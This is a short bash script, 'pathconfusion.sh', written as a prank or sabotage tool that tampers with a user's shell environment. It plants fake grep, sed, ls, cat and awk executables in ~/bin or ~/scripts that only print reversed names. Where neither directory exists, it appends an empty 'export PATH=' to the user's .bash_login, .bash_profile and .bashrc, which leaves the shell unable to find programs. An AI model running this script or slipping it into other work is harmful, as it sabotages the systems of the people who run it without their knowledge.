#!/usr/bin/env bash
#  pathconfusion.sh
#  Author: William Woodruff
#  ------------------------
#  Checks to see if the user has a ~/bin or ~/scripts directory.
#  If the user does, assumes that they are in the PATH and injects and bunch of fake programs
#  If the user doesn't, injects a blank PATH into .bash_profile, .bashrc, and .bash_login

INJECTDIR=
HASHBANG="#!/bin/sh"
ECHO="echo"

function inject_fakes()
{
	printf "%s\n%s %s\n" $HASHBANG $ECHO "perg" > $1/grep
	printf "%s\n%s %s\n" $HASHBANG $ECHO "des" > $1/sed
	printf "%s\n%s %s\n" $HASHBANG $ECHO "sl" > $1/ls
	printf "%s\n%s %s\n" $HASHBANG $ECHO "tac" > $1/cat
	printf "%s\n%s %s\n" $HASHBANG $ECHO "kwa" > $1/awk

	chmod +x $1/grep $1/sed $1/ls $1/cat $1/awk
}

if [ -d "$HOME/bin" ]; then
	INJECTDIR="$HOME/bin"
	inject_fakes $INJECTDIR
fi

if [ -d "$HOME/scripts" ]; then
	INJECTDIR="$HOME/scripts"
	inject_fakes $INJECTDIR
fi

if [ -z "$INJECTDIR" ]; then
	echo "export PATH=" >> $HOME/.bash_login
	echo "export PATH=" >> $HOME/.bash_profile
	echo "export PATH=" >> $HOME/.bashrc
fi